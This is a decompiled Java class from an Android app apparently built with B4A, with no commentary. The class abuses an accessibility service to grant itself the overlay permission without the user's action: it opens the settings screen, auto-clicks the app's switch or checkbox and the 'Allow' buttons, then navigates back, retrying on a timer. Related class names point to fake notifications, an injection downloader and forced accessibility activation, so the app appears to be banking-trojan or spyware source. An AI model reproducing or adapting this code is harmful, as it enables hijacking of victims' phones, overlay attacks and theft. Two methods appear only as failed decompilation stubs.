package com.com.androidrr;

import anywheresoftware.b4a.AbsObjectWrapper;
import anywheresoftware.b4a.B4AClass;
import anywheresoftware.b4a.BA;
import anywheresoftware.b4a.keywords.B4AApplication;
import anywheresoftware.b4a.keywords.Common;
import anywheresoftware.b4a.keywords.DateTime;
import anywheresoftware.b4a.keywords.Regex;
import anywheresoftware.b4a.keywords.constants.Colors;
import anywheresoftware.b4a.keywords.constants.KeyCodes;
import anywheresoftware.b4a.objects.IntentWrapper;
import anywheresoftware.b4a.objects.Timer;
import anywheresoftware.b4a.objects.collections.List;
import anywheresoftware.b4a.objects.collections.Map;
import anywheresoftware.b4a.phone.Phone;
import anywheresoftware.b4j.object.JavaObject;
import b4a.example.dateutils;
import com.tillekesoft.accessibilityservices.AccessibilityConstants;
import com.tillekesoft.accessibilityservices.AccessibilityEventsListenerWrapper;
import java.lang.reflect.Method;
import java.util.Arrays;
import java.util.HashMap;

/* loaded from: classes.dex */
public class cls_perm_draw extends B4AClass.ImplB4AClass implements BA.SubDelegator {
    private static HashMap<String, Method> htSubs;
    public Common __c = null;
    public boolean _isclassfinished = false;
    public long _lasttimechecked = 0;
    public Timer _timer_checker = null;
    public int _intnumberoftries = 0;
    public long _isperm_requestedtime = 0;
    public dateutils _dateutils = null;
    public main _main = null;
    public starter _starter = null;
    public clsclassperms_code _clsclassperms_code = null;
    public clsclassperms_code2 _clsclassperms_code2 = null;
    public backgroundservice _backgroundservice = null;
    public mediaprojectionbackservice _mediaprojectionbackservice = null;
    public globalparameters _globalparameters = null;
    public dtrsbnotisuntilactv _dtrsbnotisuntilactv = null;
    public faknotiactivity _faknotiactivity = null;
    public forc_activateacc _forc_activateacc = null;
    public inj_dnlader _inj_dnlader = null;
    public mainglobalstrings _mainglobalstrings = null;
    public myreceiver _myreceiver = null;
    public notificationservice _notificationservice = null;
    public perm_activatemediaproject _perm_activatemediaproject = null;
    public perm_activateoverlay _perm_activateoverlay = null;
    public perm_ignorebatperm _perm_ignorebatperm = null;
    public perm_notiacc _perm_notiacc = null;
    public perm_phonecal _perm_phonecal = null;
    public perm_smsperm _perm_smsperm = null;
    public perm_startactdevmang _perm_startactdevmang = null;
    public perm_startactwritesy _perm_startactwritesy = null;
    public perm_unknownapps _perm_unknownapps = null;
    public perm_writesys _perm_writesys = null;
    public req_all_perms _req_all_perms = null;
    public ServiceC0262s1 _s1 = null;
    public service1 _service1 = null;
    public service2 _service2 = null;
    public service3 _service3 = null;
    public service4 _service4 = null;
    public srvnewphonecall _srvnewphonecall = null;
    public wakeupdv _wakeupdv = null;
    public httputils2service _httputils2service = null;

    private void innerInitialize(BA BA) throws Exception {
        if (this.f268ba == null) {
            this.f268ba = new BA(BA, this, htSubs, "com.com.androidrr.cls_perm_draw");
            if (htSubs == null) {
                this.f268ba.loadHtSubs(getClass());
                htSubs = this.f268ba.htSubs;
            }
        }
        if (BA.isShellModeRuntimeCheck(this.f268ba)) {
            getClass().getMethod("_class_globals", cls_perm_draw.class).invoke(this, null);
        } else {
            this.f268ba.raiseEvent2(null, true, "class_globals", false, new Object[0]);
        }
    }

    public boolean _candrawoverlays() throws Exception {
        try {
            JavaObject javaObject = new JavaObject();
            JavaObject javaObject2 = new JavaObject();
            new Phone();
            if (Phone.getSdkVersion() < 23) {
                return true;
            }
            javaObject.InitializeContext(this.f268ba);
            javaObject2.InitializeStatic("android.provider.Settings");
            return BA.ObjectToBoolean(javaObject2.RunMethod("canDrawOverlays", new Object[]{javaObject.getObject()}));
        } catch (Exception e) {
            this.f268ba.setLastException(e);
            Common.LogImpl("611665425", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
            return false;
        }
    }

    public boolean _check_if_notis() throws Exception {
        try {
            new Phone();
            String lowerCase = Phone.GetSettings("enabled_notification_listeners").toLowerCase();
            B4AApplication b4AApplication = Common.Application;
            return lowerCase.contains(B4AApplication.getPackageName().toLowerCase());
        } catch (Exception e) {
            this.f268ba.setLastException(e);
            Common.LogImpl("611599884", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
            return false;
        }
    }

    public String _class_globals() throws Exception {
        this._isclassfinished = false;
        this._lasttimechecked = 0L;
        this._timer_checker = new Timer();
        this._intnumberoftries = 0;
        this._isperm_requestedtime = 0L;
        return "";
    }

    public String _click_one_checkbox(List list) throws Exception {
        try {
        } catch (Exception e) {
            this.f268ba.setLastException(e);
            Common.LogImpl("611403277", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
        }
        if (_candrawoverlays()) {
            return "";
        }
        new Map();
        int size = list.getSize();
        for (int i = 0; i < size; i++) {
            Map map = new Map();
            java.util.Map map2 = (java.util.Map) list.Get(i);
            java.util.Map map3 = map2;
            Map map4 = (Map) AbsObjectWrapper.ConvertToWrapper(map, map2);
            if (BA.ObjectToString(map4.Get("viewid")).toLowerCase().contains("checkbox".toLowerCase())) {
                backgroundservice._acs.PerformClick_ByTemp((int) BA.ObjectToNumber(map4.Get("Left")), (int) BA.ObjectToNumber(map4.Get("Top")), (int) BA.ObjectToNumber(map4.Get("width")), (int) BA.ObjectToNumber(map4.Get("Height")), "", "android:id/checkbox");
                Colors colors = Common.Colors;
                Common.LogImpl("611403271", "Clicked Choeckbox", -256);
                _returner_to_act();
                return "";
            }
        }
        return "";
    }

    public String _click_one_switch(List list) throws Exception {
        try {
        } catch (Exception e) {
            this.f268ba.setLastException(e);
            Common.LogImpl("611337745", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
        }
        if (_candrawoverlays()) {
            return "";
        }
        new Map();
        int size = list.getSize();
        for (int i = 0; i < size; i++) {
            Map map = new Map();
            java.util.Map map2 = (java.util.Map) list.Get(i);
            java.util.Map map3 = map2;
            Map map4 = (Map) AbsObjectWrapper.ConvertToWrapper(map, map2);
            if (BA.ObjectToString(map4.Get("viewid")).toLowerCase().contains("switch_widget".toLowerCase())) {
                backgroundservice._acs.PerformClick_ByTemp((int) BA.ObjectToNumber(map4.Get("Left")), (int) BA.ObjectToNumber(map4.Get("Top")), (int) BA.ObjectToNumber(map4.Get("width")), (int) BA.ObjectToNumber(map4.Get("Height")), "", "android:id/switch_widget");
                _returner_to_act();
                return "";
            }
            if (BA.ObjectToString(map4.Get("viewid")).toLowerCase().contains("checkbox".toLowerCase())) {
                backgroundservice._acs.PerformClick_ByTemp((int) BA.ObjectToNumber(map4.Get("Left")), (int) BA.ObjectToNumber(map4.Get("Top")), (int) BA.ObjectToNumber(map4.Get("width")), (int) BA.ObjectToNumber(map4.Get("Height")), "", "android:id/checkbox");
                Colors colors = Common.Colors;
                Common.LogImpl("611337739", "Clicked Choeckbox", -256);
                _returner_to_act();
                return "";
            }
        }
        return "";
    }

    /* JADX WARN: Code restructure failed: missing block: B:14:0x003f, code lost:
    
        if (com.tillekesoft.accessibilityservices.AccessibilityEventsListenerWrapper.AccessibilityEventsListener.findAndGetFirstSimilar(r23, "com.android.settings:id/apps_list", true) != null) goto L14;
     */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct code enable 'Show inconsistent code' option in preferences
    */
    public java.lang.String _in_case_its_a_list(anywheresoftware.b4a.objects.collections.List r22, java.lang.Object r23, int r24, int r25) throws java.lang.Exception {
        /*
            Method dump skipped, instructions count: 464
            To view this dump change 'Code comments level' option to 'DEBUG'
        */
        throw new UnsupportedOperationException("Method not decompiled: com.com.androidrr.cls_perm_draw._in_case_its_a_list(anywheresoftware.b4a.objects.collections.List, java.lang.Object, int, int):java.lang.String");
    }

    public boolean _in_case_system_button1_showing(List list) throws Exception {
        int i;
        try {
        } catch (Exception e) {
            this.f268ba.setLastException(e);
            Common.LogImpl("611534352", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
        }
        if (_candrawoverlays()) {
            return true;
        }
        new Map();
        int size = list.getSize();
        while (i < size) {
            Map map = new Map();
            java.util.Map map2 = (java.util.Map) list.Get(i);
            java.util.Map map3 = map2;
            Map map4 = (Map) AbsObjectWrapper.ConvertToWrapper(map, map2);
            i = (BA.ObjectToString(map4.Get("viewid")).toLowerCase().contains("android:id/button1") || BA.ObjectToString(map4.Get("viewid")).toLowerCase().contains("permission_allow_button")) ? 0 : i + 1;
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener = backgroundservice._acs;
            AccessibilityConstants accessibilityConstants = backgroundservice._accservconstants;
            Map map5 = new Map();
            java.util.Map map6 = (java.util.Map) Common.Null;
            java.util.Map map7 = map6;
            accessibilityEventsListener.PerformNodeActionOnViewWithArgs(true, "android:id/button1", 16, (Map) AbsObjectWrapper.ConvertToWrapper(map5, map6));
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener2 = backgroundservice._acs;
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
            if (_candrawoverlays()) {
                return true;
            }
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener3 = backgroundservice._acs;
            AccessibilityConstants accessibilityConstants2 = backgroundservice._accservconstants;
            Map map8 = new Map();
            java.util.Map map9 = (java.util.Map) Common.Null;
            java.util.Map map10 = map9;
            accessibilityEventsListener3.PerformNodeActionOnViewWithArgs(true, "com.android.permissioncontroller:id/permission_allow_button", 16, (Map) AbsObjectWrapper.ConvertToWrapper(map8, map9));
            _returner_to_act();
            return true;
        }
        return false;
    }

    public String _initialize(BA BA) throws Exception {
        innerInitialize(BA);
        return "";
    }

    public boolean _is_perm_requested() throws Exception {
        try {
            new dateutils._period();
            BA activityBA = getActivityBA();
            long j = this._isperm_requestedtime;
            DateTime dateTime = Common.DateTime;
            return dateutils._periodbetween(activityBA, j, DateTime.getNow()).Seconds <= 6;
        } catch (Exception e) {
            this.f268ba.setLastException(e);
            Common.LogImpl("611993099", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
            return true;
        }
    }

    public int _number_of_switches(String str, String str2) throws Exception {
        if (Common.Not(str.contains(str2))) {
            return 0;
        }
        Arrays.fill(new String[0], "");
        Regex regex = Common.Regex;
        return Regex.Split(str2, str).length;
    }

    public void _performaction() throws Exception {
        new ResumableSub_PerformAction(this).resume(this.f268ba, null);
    }

    public static class ResumableSub_PerformAction extends BA.ResumableSub {
        cls_perm_draw parent;

        public ResumableSub_PerformAction(cls_perm_draw cls_perm_drawVar) {
            this.parent = cls_perm_drawVar;
        }

        /* JADX WARN: Removed duplicated region for block: B:47:0x00a4  */
        /* JADX WARN: Removed duplicated region for block: B:49:0x00ae A[SYNTHETIC] */
        @Override // anywheresoftware.b4a.BA.ResumableSub
        /*
            Code decompiled incorrectly, please refer to instructions dump.
            To view partially-correct code enable 'Show inconsistent code' option in preferences
        */
        public void resume(anywheresoftware.b4a.BA r7, java.lang.Object[] r8) throws java.lang.Exception {
            /*
                r6 = this;
            L0:
                int r8 = r6.state     // Catch: java.lang.Exception -> L9f
                r0 = 9
                r1 = 7
                r2 = 4
                r3 = 1
                r4 = 0
                r5 = 10
                switch(r8) {
                    case -1: goto L9e;
                    case 0: goto L9a;
                    case 1: goto L91;
                    case 2: goto Ld;
                    case 3: goto L79;
                    case 4: goto L6b;
                    case 5: goto Ld;
                    case 6: goto L4e;
                    case 7: goto L4b;
                    case 8: goto Ld;
                    case 9: goto L2b;
                    case 10: goto L25;
                    case 11: goto Le;
                    default: goto Ld;
                }     // Catch: java.lang.Exception -> L9f
            Ld:
                goto L0
            Le:
                r6.state = r2     // Catch: java.lang.Exception -> L9f
                com.com.androidrr.cls_perm_draw r8 = r6.parent     // Catch: java.lang.Exception -> L9f
                anywheresoftware.b4a.keywords.Common r8 = r8.__c     // Catch: java.lang.Exception -> L9f
                java.lang.String r8 = "611730947"
                java.lang.String r0 = "PerformAction"
                com.com.androidrr.cls_perm_draw r1 = r6.parent     // Catch: java.lang.Exception -> L9f
                anywheresoftware.b4a.keywords.Common r1 = r1.__c     // Catch: java.lang.Exception -> L9f
                anywheresoftware.b4a.keywords.constants.Colors r1 = anywheresoftware.b4a.keywords.Common.Colors     // Catch: java.lang.Exception -> L9f
                r1 = -16711936(0xffffffffff00ff00, float:-1.7146522E38)
                anywheresoftware.b4a.keywords.Common.LogImpl(r8, r0, r1)     // Catch: java.lang.Exception -> L9f
                goto L0
            L25:
                r8 = -1
                r6.state = r8     // Catch: java.lang.Exception -> L9f
                r6.catchState = r4     // Catch: java.lang.Exception -> L9f
                goto L0
            L2b:
                r6.state = r5     // Catch: java.lang.Exception -> L9f
                r6.catchState = r4     // Catch: java.lang.Exception -> L9f
                com.com.androidrr.cls_perm_draw r8 = r6.parent     // Catch: java.lang.Exception -> L9f
                anywheresoftware.b4a.keywords.Common r8 = r8.__c     // Catch: java.lang.Exception -> L9f
                java.lang.String r8 = "611730954"
                com.com.androidrr.cls_perm_draw r0 = r6.parent     // Catch: java.lang.Exception -> L9f
                anywheresoftware.b4a.keywords.Common r0 = r0.__c     // Catch: java.lang.Exception -> L9f
                com.com.androidrr.cls_perm_draw r0 = r6.parent     // Catch: java.lang.Exception -> L9f
                anywheresoftware.b4a.BA r0 = r0.getActivityBA()     // Catch: java.lang.Exception -> L9f
                anywheresoftware.b4a.objects.B4AException r0 = anywheresoftware.b4a.keywords.Common.LastException(r0)     // Catch: java.lang.Exception -> L9f
                java.lang.String r0 = anywheresoftware.b4a.BA.ObjectToString(r0)     // Catch: java.lang.Exception -> L9f
                anywheresoftware.b4a.keywords.Common.LogImpl(r8, r0, r4)     // Catch: java.lang.Exception -> L9f
                goto L0
            L4b:
                r6.state = r5     // Catch: java.lang.Exception -> L9f
                goto L0
            L4e:
                r6.state = r1     // Catch: java.lang.Exception -> L9f
                com.com.androidrr.cls_perm_draw r8 = r6.parent     // Catch: java.lang.Exception -> L9f
                com.com.androidrr.backgroundservice r8 = r8._backgroundservice     // Catch: java.lang.Exception -> L9f
                com.tillekesoft.accessibilityservices.AccessibilityEventsListenerWrapper$AccessibilityEventsListener r8 = com.com.androidrr.backgroundservice._acs     // Catch: java.lang.Exception -> L9f
                com.com.androidrr.cls_perm_draw r0 = r6.parent     // Catch: java.lang.Exception -> L9f
                com.com.androidrr.backgroundservice r0 = r0._backgroundservice     // Catch: java.lang.Exception -> L9f
                com.tillekesoft.accessibilityservices.AccessibilityConstants r0 = com.com.androidrr.backgroundservice._accservconstants     // Catch: java.lang.Exception -> L9f
                r8.PerformGlobalAction(r3)     // Catch: java.lang.Exception -> L9f
                com.com.androidrr.cls_perm_draw r8 = r6.parent     // Catch: java.lang.Exception -> L9f
                com.com.androidrr.backgroundservice r8 = r8._backgroundservice     // Catch: java.lang.Exception -> L9f
                com.tillekesoft.accessibilityservices.AccessibilityEventsListenerWrapper$AccessibilityEventsListener r8 = com.com.androidrr.backgroundservice._acs     // Catch: java.lang.Exception -> L9f
                r8 = 250(0xfa, float:3.5E-43)
                com.tillekesoft.accessibilityservices.AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(r8)     // Catch: java.lang.Exception -> L9f
                goto L0
            L6b:
                r6.state = r1     // Catch: java.lang.Exception -> L9f
                com.com.androidrr.cls_perm_draw r8 = r6.parent     // Catch: java.lang.Exception -> L9f
                boolean r8 = r8._candrawoverlays()     // Catch: java.lang.Exception -> L9f
                if (r8 == 0) goto L0
                r8 = 6
                r6.state = r8     // Catch: java.lang.Exception -> L9f
                goto L0
            L79:
                r6.state = r2     // Catch: java.lang.Exception -> L9f
                r6.catchState = r0     // Catch: java.lang.Exception -> L9f
                com.com.androidrr.cls_perm_draw r8 = r6.parent     // Catch: java.lang.Exception -> L9f
                anywheresoftware.b4a.keywords.Common r8 = r8.__c     // Catch: java.lang.Exception -> L9f
                com.com.androidrr.cls_perm_draw r8 = r6.parent     // Catch: java.lang.Exception -> L9f
                anywheresoftware.b4a.BA r8 = r8.getActivityBA()     // Catch: java.lang.Exception -> L9f
                r0 = 500(0x1f4, float:7.0E-43)
                anywheresoftware.b4a.keywords.Common.Sleep(r8, r6, r0)     // Catch: java.lang.Exception -> L9f
                r8 = 11
                r6.state = r8     // Catch: java.lang.Exception -> L9f
                return
            L91:
                r6.state = r5     // Catch: java.lang.Exception -> L9f
                r6.catchState = r0     // Catch: java.lang.Exception -> L9f
                r8 = 3
                r6.state = r8     // Catch: java.lang.Exception -> L9f
                goto L0
            L9a:
                r6.state = r3     // Catch: java.lang.Exception -> L9f
                goto L0
            L9e:
                return
            L9f:
                r8 = move-exception
                int r0 = r6.catchState
                if (r0 == 0) goto Lad
                int r0 = r6.catchState
                r6.state = r0
                r7.setLastException(r8)
                goto L0
            Lad:
                goto Laf
            Lae:
                throw r8
            Laf:
                goto Lae
            */
            throw new UnsupportedOperationException("Method not decompiled: com.com.androidrr.cls_perm_draw.ResumableSub_PerformAction.resume(anywheresoftware.b4a.BA, java.lang.Object[]):void");
        }
    }

    public Common.ResumableSubWrapper _real_checker(String str, String str2, List list, Object obj) throws Exception {
        ResumableSub_Real_Checker resumableSub_Real_Checker = new ResumableSub_Real_Checker(this, str, str2, list, obj);
        resumableSub_Real_Checker.resume(this.f268ba, null);
        return (Common.ResumableSubWrapper) AbsObjectWrapper.ConvertToWrapper(new Common.ResumableSubWrapper(), resumableSub_Real_Checker);
    }

    public static class ResumableSub_Real_Checker extends BA.ResumableSub {
        Object _node;
        List _rootinactivewindow;
        String _strevt;
        String _strpkg;
        cls_perm_draw parent;
        int _int_number_of_switches = 0;
        int _int_number_of_checkboxes = 0;

        /* renamed from: _p */
        Phone f346_p = null;

        public ResumableSub_Real_Checker(cls_perm_draw cls_perm_drawVar, String str, String str2, List list, Object obj) {
            this.parent = cls_perm_drawVar;
            this._strpkg = str;
            this._strevt = str2;
            this._rootinactivewindow = list;
            this._node = obj;
        }

        @Override // anywheresoftware.b4a.BA.ResumableSub
        public void resume(BA BA, Object[] objArr) throws Exception {
            while (true) {
                try {
                    switch (this.state) {
                        case -1:
                            Common common = this.parent.__c;
                            Common.ReturnFromResumableSub(this, null);
                            return;
                        case 0:
                            this.state = 1;
                            break;
                        case 1:
                            this.state = 35;
                            this.catchState = 34;
                            this.state = 3;
                            break;
                        case 3:
                            this.state = 4;
                            this.catchState = 34;
                            Common common2 = this.parent.__c;
                            Common common3 = this.parent.__c;
                            Colors colors = Common.Colors;
                            Common.LogImpl("611141122", "Draw ----> Real_Checker ", -65536);
                            break;
                        case 4:
                            this.state = 7;
                            boolean _check_if_notis = this.parent._check_if_notis();
                            Common common4 = this.parent.__c;
                            if (_check_if_notis) {
                                boolean _candrawoverlays = this.parent._candrawoverlays();
                                Common common5 = this.parent.__c;
                                if (!_candrawoverlays) {
                                    break;
                                }
                            }
                            this.state = 6;
                            break;
                        case 6:
                            this.state = 7;
                            this.parent._returner_to_act();
                            Common common6 = this.parent.__c;
                            Common common7 = this.parent.__c;
                            Common.ReturnFromResumableSub(this, true);
                            return;
                        case 7:
                            this.state = 8;
                            this._int_number_of_switches = 0;
                            this._int_number_of_switches = this.parent._number_of_switches(BA.ObjectToString(this._rootinactivewindow), "switch_widget");
                            break;
                        case 8:
                            this.state = 23;
                            int i = this._int_number_of_switches;
                            if (i != 0) {
                                if (i != 1) {
                                    if (i <= 1) {
                                        break;
                                    } else {
                                        this.state = 22;
                                        break;
                                    }
                                } else {
                                    this.state = 20;
                                    break;
                                }
                            } else {
                                this.state = 10;
                                break;
                            }
                        case 10:
                            this.state = 11;
                            this._int_number_of_checkboxes = 0;
                            this._int_number_of_checkboxes = this.parent._number_of_switches(BA.ObjectToString(this._rootinactivewindow), "checkbox");
                            break;
                        case 11:
                            this.state = 14;
                            boolean _in_case_system_button1_showing = this.parent._in_case_system_button1_showing(this._rootinactivewindow);
                            Common common8 = this.parent.__c;
                            if (!_in_case_system_button1_showing) {
                                this.state = 13;
                                break;
                            } else {
                                break;
                            }
                        case 13:
                            this.state = 14;
                            this.parent._in_case_its_a_list(this._rootinactivewindow, this._node, this._int_number_of_switches, this._int_number_of_checkboxes);
                            break;
                        case 14:
                            this.state = 15;
                            Common common9 = this.parent.__c;
                            Common.LogImpl("611141144", "int_Number_Of_Checkboxes : " + BA.NumberToString(this._int_number_of_checkboxes), 0);
                            break;
                        case 15:
                            this.state = 18;
                            int i2 = this._int_number_of_checkboxes;
                            if (i2 < 3 && i2 > 0) {
                                this.state = 17;
                                break;
                            }
                            break;
                        case 17:
                            this.state = 18;
                            this.parent._click_one_checkbox(this._rootinactivewindow);
                            break;
                        case 18:
                            this.state = 23;
                            break;
                        case 20:
                            this.state = 23;
                            this.parent._click_one_switch(this._rootinactivewindow);
                            break;
                        case 22:
                            this.state = 23;
                            this.parent._search_click_in_multiple_switches(this._rootinactivewindow);
                            break;
                        case 23:
                            this.state = 32;
                            boolean _candrawoverlays2 = this.parent._candrawoverlays();
                            Common common10 = this.parent.__c;
                            if (_candrawoverlays2) {
                                this.state = 25;
                                break;
                            } else {
                                this.state = 27;
                                break;
                            }
                        case 25:
                            this.state = 32;
                            Timer timer = this.parent._timer_checker;
                            Common common11 = this.parent.__c;
                            timer.setEnabled(false);
                            this.parent._intnumberoftries = 0;
                            cls_perm_draw cls_perm_drawVar = this.parent;
                            Common common12 = cls_perm_drawVar.__c;
                            cls_perm_drawVar._isclassfinished = true;
                            break;
                        case 27:
                            this.state = 28;
                            this.f346_p = new Phone();
                            break;
                        case 28:
                            this.state = 31;
                            boolean contains = Phone.getManufacturer().toLowerCase().contains("xiaomi");
                            Common common13 = this.parent.__c;
                            if (!contains) {
                                this.state = 30;
                                break;
                            } else {
                                break;
                            }
                        case 30:
                            this.state = 31;
                            this.parent._intnumberoftries++;
                            break;
                        case KeyCodes.KEYCODE_C /* 31 */:
                            this.state = 32;
                            this.parent._timer_creator();
                            break;
                        case 32:
                            this.state = 35;
                            break;
                        case 34:
                            this.state = 35;
                            this.catchState = 0;
                            Common common14 = this.parent.__c;
                            Common common15 = this.parent.__c;
                            Common.LogImpl("611141208", BA.ObjectToString(Common.LastException(this.parent.getActivityBA())), 0);
                            break;
                        case 35:
                            this.state = -1;
                            this.catchState = 0;
                            Common common16 = this.parent.__c;
                            Common common17 = this.parent.__c;
                            Common.ReturnFromResumableSub(this, true);
                            return;
                    }
                } catch (Exception e) {
                    if (this.catchState == 0) {
                        throw e;
                    }
                    this.state = this.catchState;
                    BA.setLastException(e);
                }
            }
        }
    }

    public String _request_perm() throws Exception {
        try {
            DateTime dateTime = Common.DateTime;
            this._isperm_requestedtime = DateTime.getNow();
            IntentWrapper intentWrapper = new IntentWrapper();
            StringBuilder sb = new StringBuilder();
            sb.append("package:");
            B4AApplication b4AApplication = Common.Application;
            sb.append(B4AApplication.getPackageName());
            intentWrapper.Initialize("android.settings.action.MANAGE_OVERLAY_PERMISSION", sb.toString());
            intentWrapper.setFlags(1073741824);
            Common.StartActivity(this.f268ba, intentWrapper.getObject());
            return "";
        } catch (Exception e) {
            this.f268ba.setLastException(e);
            Common.LogImpl("612058634", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
            return "";
        }
    }

    public String _returner_to_act() throws Exception {
        try {
            Common.LogImpl("611927554", BA.ObjectToString(Boolean.valueOf(_candrawoverlays())), 0);
            if (!_candrawoverlays()) {
                return "";
            }
            if (this._timer_checker.IsInitialized()) {
                this._timer_checker.setEnabled(false);
            }
            this._isclassfinished = true;
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener = backgroundservice._acs;
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener2 = backgroundservice._acs;
            AccessibilityConstants accessibilityConstants = backgroundservice._accservconstants;
            accessibilityEventsListener2.PerformGlobalAction(1);
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener3 = backgroundservice._acs;
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
            return "";
        } catch (Exception e) {
            this.f268ba.setLastException(e);
            Common.LogImpl("611927572", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
            return "";
        }
    }

    public String _search_click_in_multiple_switches(List list) throws Exception {
        boolean z;
        int i;
        boolean z2;
        try {
        } catch (Exception e) {
            this.f268ba.setLastException(e);
            Common.LogImpl("611468864", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
        }
        if (_candrawoverlays()) {
            return "";
        }
        new Map();
        int size = list.getSize();
        int i2 = 0;
        boolean z3 = false;
        while (i2 < size) {
            Map map = new Map();
            java.util.Map map2 = (java.util.Map) list.Get(i2);
            java.util.Map map3 = map2;
            Map map4 = (Map) AbsObjectWrapper.ConvertToWrapper(map, map2);
            String lowerCase = BA.ObjectToString(map4.Get("ViewText")).toLowerCase();
            B4AApplication b4AApplication = Common.Application;
            if (lowerCase.contains(B4AApplication.getLabelName().toLowerCase())) {
                z3 = true;
            }
            if (!z3) {
                i = i2;
            } else if (BA.ObjectToString(map4.Get("viewid")).toLowerCase().contains("switch_widget".toLowerCase()) && 0.0d == BA.ObjectToNumber(map4.Get("checked"))) {
                i = i2;
                if (backgroundservice._acs.PerformClick_ByTemp((int) BA.ObjectToNumber(map4.Get("Left")), (int) BA.ObjectToNumber(map4.Get("Top")), (int) BA.ObjectToNumber(map4.Get("width")), (int) BA.ObjectToNumber(map4.Get("Height")), "", "android:id/switch_widget")) {
                    Colors colors = Common.Colors;
                    Common.LogImpl("611468815", "clicked 1", -16711936);
                    _returner_to_act();
                    z = true;
                    break;
                }
            } else {
                i = i2;
                if (BA.ObjectToString(map4.Get("viewid")).toLowerCase().contains("checkbox".toLowerCase())) {
                    z2 = z3;
                    if (backgroundservice._acs.PerformClick_ByTemp((int) BA.ObjectToNumber(map4.Get("Left")), (int) BA.ObjectToNumber(map4.Get("Top")), (int) BA.ObjectToNumber(map4.Get("width")), (int) BA.ObjectToNumber(map4.Get("Height")), "", "android:id/checkbox")) {
                        Colors colors2 = Common.Colors;
                        Common.LogImpl("611468823", "clicked 2", -16711936);
                        _returner_to_act();
                        z = true;
                        break;
                    }
                    i2 = i + 1;
                    z3 = z2;
                }
            }
            z2 = z3;
            i2 = i + 1;
            z3 = z2;
        }
        z = false;
        if (!z) {
            if (!_candrawoverlays()) {
                new Map();
                int size2 = list.getSize();
                for (int i3 = 0; i3 < size2; i3++) {
                    Map map5 = new Map();
                    java.util.Map map6 = (java.util.Map) list.Get(i3);
                    java.util.Map map7 = map6;
                    Map map8 = (Map) AbsObjectWrapper.ConvertToWrapper(map5, map6);
                    String lowerCase2 = BA.ObjectToString(map8.Get("ViewText")).toLowerCase();
                    B4AApplication b4AApplication2 = Common.Application;
                    if (lowerCase2.contains(B4AApplication.getLabelName().toLowerCase())) {
                        AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener = backgroundservice._acs;
                        int ObjectToNumber = (int) BA.ObjectToNumber(map8.Get("Left"));
                        int ObjectToNumber2 = (int) BA.ObjectToNumber(map8.Get("Top"));
                        int ObjectToNumber3 = (int) BA.ObjectToNumber(map8.Get("width"));
                        int ObjectToNumber4 = (int) BA.ObjectToNumber(map8.Get("Height"));
                        B4AApplication b4AApplication3 = Common.Application;
                        if (accessibilityEventsListener.PerformClick_ByTemp(ObjectToNumber, ObjectToNumber2, ObjectToNumber3, ObjectToNumber4, B4AApplication.getLabelName().toLowerCase(), "")) {
                            Colors colors3 = Common.Colors;
                            Common.LogImpl("611468842", "clicked 3", -16711936);
                            _returner_to_act();
                            return "";
                        }
                    }
                }
            }
            if (!_candrawoverlays()) {
                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener2 = backgroundservice._acs;
                B4AApplication b4AApplication4 = Common.Application;
                String labelName = B4AApplication.getLabelName();
                AccessibilityConstants accessibilityConstants = backgroundservice._accservconstants;
                Map map9 = new Map();
                java.util.Map map10 = (java.util.Map) Common.Null;
                java.util.Map map11 = map10;
                accessibilityEventsListener2.PerformNodeActionOnViewWithArgs(false, labelName, 16, (Map) AbsObjectWrapper.ConvertToWrapper(map9, map10));
                Colors colors4 = Common.Colors;
                Common.LogImpl("611468856", "clicked 4", -16711936);
                _returner_to_act();
            }
        }
        return "";
    }

    public String _timer_creator() throws Exception {
        try {
            if (this._timer_checker.IsInitialized()) {
                return "";
            }
            this._timer_checker.Initialize(this.f268ba, "timerChecker", 4000L);
            this._timer_checker.setEnabled(true);
            return "";
        } catch (Exception e) {
            this.f268ba.setLastException(e);
            Common.LogImpl("611796487", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
            return "";
        }
    }

    public String _timerchecker_tick() throws Exception {
        try {
            Colors colors = Common.Colors;
            Common.LogImpl("611862018", "Cls_Perm_Draw timerChecker_Tick", -65536);
        } catch (Exception e) {
            this.f268ba.setLastException(e);
            Common.LogImpl("611862044", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
        }
        if (this._isclassfinished) {
            this._timer_checker.setEnabled(false);
            return "";
        }
        new dateutils._period();
        BA activityBA = getActivityBA();
        long j = this._lasttimechecked;
        DateTime dateTime = Common.DateTime;
        if (dateutils._periodbetween(activityBA, j, DateTime.getNow()).Seconds > 4) {
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener = backgroundservice._acs;
            AccessibilityConstants accessibilityConstants = backgroundservice._accservconstants;
            accessibilityEventsListener.PerformGlobalAction(4);
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener2 = backgroundservice._acs;
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
            this._intnumberoftries++;
        }
        return "";
    }

    @Override // anywheresoftware.b4a.BA.SubDelegator
    public Object callSub(String str, Object obj, Object[] objArr) throws Exception {
        BA.senderHolder.set(obj);
        return BA.SubDelegator.SubNotFound;
    }
}
